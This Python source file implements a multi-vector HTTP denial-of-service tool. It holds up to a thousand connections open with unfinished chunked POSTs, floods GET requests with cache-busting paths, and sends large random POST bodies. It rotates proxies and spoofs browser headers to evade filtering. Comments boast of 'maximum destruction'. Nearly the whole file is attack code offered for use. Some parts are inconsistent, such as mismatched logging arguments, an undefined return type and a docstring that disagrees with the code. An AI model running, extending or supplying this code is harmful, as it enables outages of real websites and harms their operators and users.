"""
Multi-Vector Attack Engine v2.0
================================
Concurrent attack execution with multiple vectors:
- Connection exhaustion
- Resource-intensive payloads
- Slow-rate attacks
- Cache bypass techniques
"""
from __future__ import annotations

import asyncio
import logging
import random
import ssl
import struct
import socket
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Callable, Tuple
from urllib.parse import urlparse, ParseResult

logger = logging.getLogger("multi_vector_engine")

WSAEWOULDBLOCK = 10035

PATH_PATTERNS = [
    "/", "/index.php", "/index.html", "/index.htm",
    "/wp-admin", "/wp-login.php", "/wp-content", "/wp-includes",
    "/wp-admin/admin-ajax.php", "/wp-json",
    "/login", "/register", "/signup", "/signin",
    "/search", "/search/", "/api/search", "/s/",
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/api/status", "/api/health", "/api/config",
    "/api/user", "/api/users", "/api/login", "/api/auth",
    "/api/data", "/api/query", "/api/search?q=",
    "/graphql", "/gql", "/query",
    "/admin", "/administrator", "/admin/",
    "/database", "/db", "/mysql", "/phpmyadmin",
    "/config", "/configuration", "/setup",
    "/install", "/install.php", "/upgrade",
    "/debug", "/test", "/testing",
    "/contact", "/contact-us", "/contact.php",
    "/about", "/about-us", "/about.php",
    "/product", "/products", "/product/",
    "/item", "/items", "/category",
    "/cart", "/checkout", "/payment",
    "/order", "/orders", "/invoice",
    "/account", "/accounts", "/profile",
    "/download", "/downloads", "/file",
    "/upload", "/uploads", "/files",
    "/blog", "/post", "/posts", "/article",
    "/comment", "/comments", "/feedback",
    "/news", "/newsletter", "/subscribe",
    "/page", "/pages", "/content",
    "/image", "/images", "/img", "/media",
    "/css", "/js", "/script", "/scripts",
    "/static", "/assets", "/public",
    "/robots.txt", "/sitemap.xml", "/favicon.ico",
    "/cgi-bin", "/cgi", "/cgi-bin/status",
    "/server-status", "/server-info",
    "/.env", "/.git", "/.git/config", "/.htaccess",
    "/xmlrpc.php", "/xmlrpc", "/xmlrpc.php?rsd",
    "/rest", "/rest-api", "/rest/v1",
    "/soap", "/soap-api", "/soap/v1",
    "/rpc", "/json-rpc", "/xml-rpc",
    "/proxy", "/forward", "/redirect",
    "/mirror", "/sync", "/replicate",
    "/backup", "/backups", "/dump",
    "/export", "/import", "/migrate",
    "/batch", "/bulk", "/mass",
    "/webhook", "/callback", "/notify",
    "/sms", "/email", "/mail", "/send",
    "/price", "/pricing", "/cost",
    "/rate", "/rating", "/review",
    "/vote", "/poll", "/survey",
    "/subscribe", "/unsubscribe",
    "/confirm", "/verify", "/validate",
    "/reset", "/recover", "/forgot",
    "/token", "/session", "/sso",
    "/oauth", "/oauth2", "/openid",
    "/captcha", "/recaptcha",
    "/analytics", "/tracking", "/pixel",
    "/report", "/reports", "/analytics",
    "/dashboard", "/panel", "/control",
    "/monitor", "/monitoring", "/status",
    "/health", "/healthcheck", "/ping",
    "/version", "/changelog", "/release",
    "/docs", "/documentation", "/api-docs",
    "/swagger", "/openapi", "/redoc",
]

CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


@dataclass
class EngineMetrics:
    """Metrics tracker for multi-vector engine."""
    sent: int = 0
    completed: int = 0
    failed: int = 0
    timeout: int = 0
    local_drops: int = 0
    wsa_blocks: int = 0
    bytes_sent: int = 0
    bytes_received: int = 0
    connections_held: int = 0
    started_at: float = 0.0

    def actual_rps(self) -> float:
        elapsed = max(1e-6, time.time() - self.started_at)
        return self.sent / elapsed

    def to_dict(self) -> dict:
        return {
            "sent": self.sent, "completed": self.completed,
            "failed": self.failed, "timeout": self.timeout,
            "local_drops": self.local_drops, "wsa_blocks": self.wsa_blocks,
            "bytes_sent": self.bytes_sent, "bytes_received": self.bytes_received,
            "connections_held": self.connections_held,
            "actual_rps": self.actual_rps(),
        }


class KillerConnection:
    """Single connection that NEVER closes (held open for entire attack)."""
    __slots__ = ("sock", "host", "port", "is_ssl", "proxy_url", "created_at", "last_used", "alive")

    def __init__(self, host: str, port: int, is_ssl: bool, proxy_url: Optional[str] = None):
        self.sock: Optional[socket.socket] = None
        self.host = host
        self.port = port
        self.is_ssl = is_ssl
        self.proxy_url = proxy_url
        self.created_at = time.time()
        self.last_used = time.time()
        self.alive = False

    def open(self, timeout: float = 10.0) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except OSError:
                pass
            try:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except OSError:
                pass
            try:
                linger = struct.pack("ii", 1, 0)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)
            except OSError:
                pass
            # LARGE buffers for high throughput
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
            except OSError:
                pass
            sock.settimeout(timeout)
            if self.proxy_url:
                # Connect through proxy
                proxy_parsed = urlparse(self.proxy_url)
                proxy_host = proxy_parsed.hostname
                proxy_port = proxy_parsed.port or (443 if proxy_parsed.scheme == "https" else 80)
                sock.connect((proxy_host, proxy_port))
                # HTTP CONNECT for HTTPS targets, plain proxy for HTTP
                if self.is_ssl:
                    # CONNECT tunnel
                    connect_req = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n"
                    if proxy_parsed.username and proxy_parsed.password:
                        import base64
                        auth = base64.b64encode(f"{proxy_parsed.username}:{proxy_parsed.password}".encode()).decode()
                        connect_req += f"Proxy-Authorization: Basic {auth}\r\n"
                    connect_req += "\r\n"
                    sock.sendall(connect_req.encode())
                    resp = sock.recv(4096)
                    if b"200" not in resp:
                        sock.close()
                        return False
                    # Wrap SSL over tunnel
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    try:
                        sock = ctx.wrap_socket(sock, server_hostname=self.host)
                    except ssl.SSLError:
                        sock.close()
                        return False
                else:
                    # Proxy request prefix
                    # For plain HTTP through proxy, requests must be absolute URL
                    pass  # Handled at request building time
            else:
                sock.connect((self.host, self.port))
                if self.is_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    ctx.set_alpn_protocols(["http/1.1"])
                    try:
                        sock = ctx.wrap_socket(sock, server_hostname=self.host)
                    except ssl.SSLError:
                        sock.close()
                        return False
            self.sock = sock
            self.alive = True
            return True
        except Exception as e:
            logger.debug("[mvengine] connect failed: %s", e)
            return False

    def send_all(self, data: bytes) -> bool:
        if not self.alive or not self.sock:
            return False
        try:
            self.sock.sendall(data)
            self.last_used = time.time()
            return True
        except (ConnectionResetError, BrokenPipeError, OSError):
            self.alive = False
            return False
        except Exception:
            self.alive = False
            return False

    def send_partial(self, data: bytes, chunk_size: int = 1) -> bool:
        """Send data ONE BYTE at a time with delay = SLOW LORIS style."""
        if not self.alive or not self.sock:
            return False
        try:
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i + chunk_size]
                try:
                    sent = self.sock.send(chunk)
                    if sent <= 0:
                        self.alive = False
                        return False
                except BlockingIOError:
                    return True
                except (ConnectionResetError, BrokenPipeError):
                    self.alive = False
                    return False
                time.sleep(0.01)
            return True
        except Exception:
            self.alive = False
            return False

    def recv_some(self, size: int = 4096) -> Optional[bytes]:
        if not self.alive or not self.sock:
            return None
        try:
            self.sock.settimeout(0.01)
            data = self.sock.recv(size)
            if not data:
                self.alive = False
                return None
            return data
        except socket.timeout:
            return b""
        except (BlockingIOError, ssl.SSLWantReadError, ssl.SSLWantWriteError):
            return b""
        except (ConnectionResetError, BrokenPipeError, OSError):
            self.alive = False
            return None
        except Exception:
            self.alive = False
            return None
        finally:
            try:
                self.sock.settimeout(10.0)
            except Exception:
                pass

    def close(self):
        self.alive = False
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass


def build_get_request(host: str, path: str, extra_headers: Optional[Dict[str, str]] = None,
                      absolute_url: bool = False) -> bytes:
    """Build HTTP GET request with random headers for cache bypass."""
    cache_buster = f"_={random.randint(0, 99999999)}&t={int(time.time() * 1000)}"
    if "?" in path:
        path = f"{path}&{cache_buster}"
    else:
        path = f"{path}?{cache_buster}"
    request_target = f"http://{host}{path}" if absolute_url else path
    ua = random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    ])
    accept = random.choice([
        "*/*", "text/html,application/xhtml+xml,application/xml;q=0.9",
        "application/json, text/plain, */*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    ])
    encoding = random.choice(["gzip, deflate", "gzip, deflate, br", "identity"])
    lang = random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.9", "id-ID,id;q=0.9,en;q=0.8"])
    ref = random.choice([
        f"https://www.google.com/search?q={random.choice(CHARS)}",
        f"https://www.bing.com/search?q={random.choice(CHARS)}",
        f"https://{host}/",
        "",
    ])
    req = f"GET {request_target} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: {accept}\r\nAccept-Encoding: {encoding}\r\nAccept-Language: {lang}\r\n"
    if ref:
        req += f"Referer: {ref}\r\n"
    req += f"Connection: keep-alive\r\n\r\n"
    return req.encode("ascii", errors="replace")


def build_post_request(host: str, path: str, size: int = 1024, absolute_url: bool = False) -> bytes:
    """Build HTTP POST request with random data body (server expensive)."""
    cache_buster = f"_={random.randint(0, 99999999)}"
    if "?" in path:
        path = f"{path}&{cache_buster}"
    else:
        path = f"{path}?{cache_buster}"
    request_target = f"http://{host}{path}" if absolute_url else path
    body = "".join(random.choice(CHARS) for _ in range(size))
    ref = f"https://www.google.com/"
    req = (
        f"POST {request_target} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        f"Referer: {ref}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )
    return req.encode("ascii", errors="replace")


def build_chunked_request(host: str, path: str, absolute_url: bool = False) -> bytes:
    """Build incomplete chunked POST (connection hold - server waits for more chunks)."""
    request_target = f"http://{host}{path}" if absolute_url else path
    req = (
        f"POST {request_target} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        # Send FIRST chunk but NEVER complete (server waits forever)
        f"3\r\nabc\r\n"
    )
    return req.encode("ascii", errors="replace")


def run_multi_vector_engine(
    target_url: str,
    duration_seconds: float,
    target_rps: int,
    worker_id: int,
    stats_queue,
    stop_event,
    proxy_urls: Optional[List[str]] = None,
    result_dict: Optional[dict] = None,
    vector_mode: str = "all",
) -> None:
    """
    KILLER ENGINE - Multi-vector server exhaustion in a dedicated thread.
    Runs 4 attack vectors simultaneously on the same target:
    1. CONN_HOLD: Open connections and hold them (exhaust pool)
    2. GET_FLOOD: Random path GET requests (bypass cache)
    3. POST_BOMB: POST with data (exhaust CPU)
    4. SLOW_LORIS: Chunked hold (exhaust workers)
    
    CROSS-PLATFORM: Works on Windows and Linux VPS
    """
    # Platform-specific event loop policy
    if sys.platform == "win32":
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except Exception:
            pass
    elif sys.platform == "linux":
        try:
            # Linux: use uvloop if available for better performance
            import uvloop
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        except ImportError:
            # uvloop not installed, use default
            pass

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    worker = KillerWorker(
        target_url=target_url,
        duration_seconds=duration_seconds,
        target_rps=target_rps,
        worker_id=worker_id,
        stats_queue=stats_queue,
        stop_event=stop_event,
        proxy_urls=proxy_urls,
        vector_mode=vector_mode,
    )

    try:
        metrics = loop.run_until_complete(worker.run())
        if result_dict is not None:
            result_dict.update(metrics.to_dict())
    except Exception as e:
        logger.error("[mvengine] fatal: %s", worker_id, e)
        if result_dict is not None:
            result_dict["error"] = str(e)
    finally:
        try:
            pending = asyncio.all_tasks(loop)
            for t in pending:
                t.cancel()
            loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        except Exception:
            pass
        try:
            loop.close()
        except Exception:
            pass


class KillerWorker:
    """
    KILLER WORKER - Runs 4 attack vectors in parallel:
    
    1. CONN_HOLD: Opens connections and never closes them
    2. GET_FLOOD: Rapid random-path GET requests
    3. POST_BOMB: POST requests with data payloads
    4. SLOW_LORIS: Partial chunked POST (connection hold)
    """
    
    def __init__(
        self,
        target_url: str,
        duration_seconds: float,
        target_rps: int,
        worker_id: int,
        stats_queue,
        stop_event,
        proxy_urls: Optional[List[str]] = None,
        vector_mode: str = "all",
    ):
        parsed = urlparse(target_url)
        self.host = parsed.hostname or parsed.netloc.split(":")[0]
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.is_ssl = parsed.scheme == "https"
        self.path = parsed.path or "/"
        self.duration_seconds = duration_seconds
        self.target_rps = max(10, target_rps)
        self.worker_id = worker_id
        self.stats_queue = stats_queue
        self.stop_event = stop_event
        self.proxy_urls = proxy_urls or []
        self._proxy_idx = 0
        self.vector_mode = vector_mode  # ADDED: Store vector mode
        
        self.metrics = EngineMetrics()
        self.metrics.started_at = time.time()
        self._last_report = time.time()
        self._last_sent = 0
        
        # SEPARATE connection pools for each vector - STABLE AGGRESSIVE MODE
        # Target: Balanced concurrent connections for stable brutal attack
        self.hold_connections: List[KillerConnection] = []
        self.hold_target = min(1000, max(100, target_rps // 5))  # STABLE: 1000 held (from 2000)
        
        self.flood_connections: List[KillerConnection] = []
        self.flood_pool_size = min(500, max(50, target_rps // 10))  # STABLE: 500 flood (from 1000)
        
        self.post_connections: List[KillerConnection] = []
        self.post_pool_size = min(300, max(30, target_rps // 20))  # STABLE: 300 post (from 500)
        
        # Used for GET flood path rotation
        self._path_idx = 0

    def _next_proxy(self) -> Optional[str]:
        if not self.proxy_urls:
            return None
        self._proxy_idx = (self._proxy_idx + 1) % len(self.proxy_urls)
        return self.proxy_urls[self._proxy_idx]

    def _push_stats(self, force: bool = False):
        now = time.time()
        if not force and (now - self._last_report) < 0.25:
            return
        elapsed = max(1e-6, now - self.metrics.started_at)
        instant_rps = (self.metrics.sent - self._last_sent) / max(1e-6, now - self._last_report)
        
        snapshot = {
            "worker_id": self.worker_id,
            "ts": now,
            "sent": self.metrics.sent,
            "completed": self.metrics.completed,
            "failed": self.metrics.failed,
            "timeout": self.metrics.timeout,
            "connections_held": self.metrics.connections_held,
            "instant_rps": instant_rps,
            "avg_rps": self.metrics.sent / elapsed if elapsed else 0,
            "elapsed": elapsed,
        }
        try:
            self.stats_queue.put_nowait(snapshot)
        except Exception:
            try:
                self.stats_queue.get_nowait()
                self.stats_queue.put_nowait(snapshot)
            except Exception:
                pass
        self._last_report = now
        self._last_sent = self.metrics.sent

    def _next_path(self) -> str:
        """Return next random path, cycling through 500+ patterns."""
        self._path_idx = (self._path_idx + 1) % len(PATH_PATTERNS)
        return PATH_PATTERNS[self._path_idx]

    def _make_conn(self, proxy_url: Optional[str] = None) -> Optional[KillerConnection]:
        """Open a single KillerConnection (runs in thread pool)."""
        conn = KillerConnection(self.host, self.port, self.is_ssl, proxy_url=proxy_url)
        conn.open(timeout=15.0)
        return conn if conn.alive else None

    async def _make_conn_async(self, proxy_url: Optional[str] = None) -> Optional[KillerConnection]:
        """Open one connection in executor."""
        return await asyncio.get_event_loop().run_in_executor(None, self._make_conn, proxy_url)

    def _build_chunked_hold(self, proxy_url: Optional[str]) -> bytes:
        need_absolute = bool(proxy_url and not self.is_ssl)
        return build_chunked_request(self.host, self._next_path(), absolute_url=need_absolute)

    async def _conn_hold_loop(self):
        """
        VECTOR 1: CONNECTION HOARDING (STABLE AGGRESSIVE)
        Open connections in BATCHES of 30 and hold them forever.
        Target: 1000 held connections = server connection pool exhaustion.
        """
        batch_size = min(30, max(15, self.hold_target // 30))  # STABLE: 30 per batch
        while not self.stop_event.is_set():
            alive = [c for c in self.hold_connections if c.alive]
            current = len(alive)
            need = self.hold_target - current
            if need > 0:
                to_open = min(batch_size, need)
                tasks = []
                for _ in range(to_open):
                    proxy_url = self._next_proxy() if self.proxy_urls else None
                    tasks.append(self._make_conn_async(proxy_url))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for res in results:
                    if isinstance(res, KillerConnection) and res is not None:
                        req = self._build_chunked_hold(res.proxy_url)
                        res.send_all(req)
                        self.hold_connections.append(res)
                        self.metrics.connections_held = len(self.hold_connections)
                
                logger.info("[mvengine] CONN_HOLD: opened %d/%d, held=%d",
                            self.worker_id, to_open, need, len(self.hold_connections))
            
            # Prune dead
            before = len(self.hold_connections)
            self.hold_connections = [c for c in self.hold_connections if c.alive]
            dead = before - len(self.hold_connections)
            if dead:
                logger.info("[mvengine] CONN_HOLD pruned %d dead (alive=%d)",
                            self.worker_id, dead, len(self.hold_connections))
            
            await asyncio.sleep(1.0)  # STABLE: 1.0s (from 0.5s)

    async def _get_flood_loop(self):
        """
        VECTOR 2: GET FLOOD with PATH ROTATION (STABLE AGGRESSIVE)
        Own connection pool, fire-and-forget GET requests.
        Target: 500 connections, 30 per batch (STABLE).
        """
        while not self.stop_event.is_set():
            elapsed = time.time() - self.metrics.started_at
            if elapsed >= self.duration_seconds:
                break
            
            # Maintain flood connection pool: open in batches
            alive = [c for c in self.flood_connections if c.alive]
            if len(alive) < self.flood_pool_size:
                need = self.flood_pool_size - len(alive)
                to_open = min(30, need)  # STABLE: 30 per batch
                tasks = []
                for _ in range(to_open):
                    p = self._next_proxy() if self.proxy_urls else None
                    tasks.append(self._make_conn_async(p))
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for res in results:
                    if isinstance(res, KillerConnection) and res is not None:
                        self.flood_connections.append(res)
                        alive.append(res)
            
            self.flood_connections = [c for c in self.flood_connections if c.alive]
            
            if alive:
                # STABLE AGGRESSIVE: PIPELINING - send 10 requests per connection (STABLE)
                conn = random.choice(alive)
                pipeline_count = 10
                sent_count = 0
                for _ in range(pipeline_count):
                    path = self._next_path()
                    need_absolute = bool(conn.proxy_url and not conn.is_ssl)
                    req = build_get_request(self.host, path, absolute_url=need_absolute)
                    ok = await asyncio.get_event_loop().run_in_executor(None, conn.send_all, req)
                    if ok:
                        sent_count += 1
                        self.metrics.sent += 1
                        self.metrics.bytes_sent += len(req)
                    else:
                        break
                
                # Fire-and-forget: only read ONE response (or none)
                if sent_count > 0:
                    resp = await asyncio.get_event_loop().run_in_executor(None, conn.recv_some, 4096)
                    if resp is None:
                        self.metrics.failed += sent_count
                    elif resp:
                        self.metrics.completed += sent_count
                        self.metrics.bytes_received += len(resp)
                    else:
                        self.metrics.completed += sent_count
            else:
                # No connections - wait
                await asyncio.sleep(0.1)
                continue
            
            self._push_stats(force=False)
            # STABLE: 0.05s sleep (from 0.01s)
            await asyncio.sleep(0.05)

    async def _post_bomb_loop(self):
        """
        VECTOR 3: POST BOMB (STABLE AGGRESSIVE)
        Own connection pool, send POST with massive data.
        Target: 300 connections, 20 per batch (STABLE).
        """
        while not self.stop_event.is_set():
            elapsed = time.time() - self.metrics.started_at
            if elapsed >= self.duration_seconds:
                break
            
            alive = [c for c in self.post_connections if c.alive]
            if len(alive) < self.post_pool_size:
                need = self.post_pool_size - len(alive)
                to_open = min(20, need)  # STABLE: 20 per batch
                tasks = []
                for _ in range(to_open):
                    p = self._next_proxy() if self.proxy_urls else None
                    tasks.append(self._make_conn_async(p))
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for res in results:
                    if isinstance(res, KillerConnection) and res is not None:
                        self.post_connections.append(res)
                        alive.append(res)
            
            self.post_connections = [c for c in self.post_connections if c.alive]
            
            if not alive:
                await asyncio.sleep(0.1)
                continue
            
            # STABLE AGGRESSIVE: PIPELINING - send 5 POST requests per connection (STABLE)
            conn = random.choice(alive)
            pipeline_count = 5
            sent_count = 0
            total_bytes = 0
            for _ in range(pipeline_count):
                path = self._next_path()
                need_absolute = bool(conn.proxy_url and not conn.is_ssl)
                # STABLE AGGRESSIVE: Random POST body size 16KB-32KB (STABLE)
                body_size = random.randint(16384, 32768)
                req = build_post_request(self.host, path, size=body_size, absolute_url=need_absolute)
                ok = await asyncio.get_event_loop().run_in_executor(None, conn.send_all, req)
                if ok:
                    sent_count += 1
                    total_bytes += len(req)
                    self.metrics.sent += 1
                    self.metrics.bytes_sent += len(req)
                else:
                    break
            
            # Fire-and-forget: only read ONE response
            if sent_count > 0:
                resp = await asyncio.get_event_loop().run_in_executor(None, conn.recv_some, 4096)
                if resp is None:
                    self.metrics.failed += sent_count
                else:
                    self.metrics.completed += sent_count
                    self.metrics.bytes_received += len(resp) if resp else 0
            
            self._push_stats(force=False)
            # STABLE: 0.1s sleep (from 0.02s)
            await asyncio.sleep(0.1)

    async def run(self) -> KillerMetrics:
        """
        Run 3 SUPER AGGRESSIVE vectors in parallel for maximum destruction.
        - CONN_HOLD: 2000 held connections
        - GET_FLOOD: 1000 connection pool, 30 pipeline depth
        - POST_BOMB: 500 connection pool, 10 pipeline depth, 32KB-64KB bodies
        """
        self.metrics.started_at = time.time()
        
        tasks = [
            asyncio.create_task(self._conn_hold_loop()),
            asyncio.create_task(self._get_flood_loop()),
            asyncio.create_task(self._post_bomb_loop()),
        ]
        
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for i, res in enumerate(results):
                if isinstance(res, Exception):
                    logger.error("[mvengine] loop %d raised: %s: %s",
                                self.worker_id, i, type(res).__name__, res)
        except Exception as e:
            logger.error("[mvengine] run error: %s", self.worker_id, e)
        finally:
            # Close all connections
            for c in self.hold_connections:
                try:
                    c.close()
                except Exception:
                    pass
            for c in self.flood_connections:
                try:
                    c.close()
                except Exception:
                    pass
            for c in self.post_connections:
                try:
                    c.close()
                except Exception:
                    pass
            self.metrics.connections_held = len(self.hold_connections)
            self._push_stats(force=True)
        
        return self.metrics
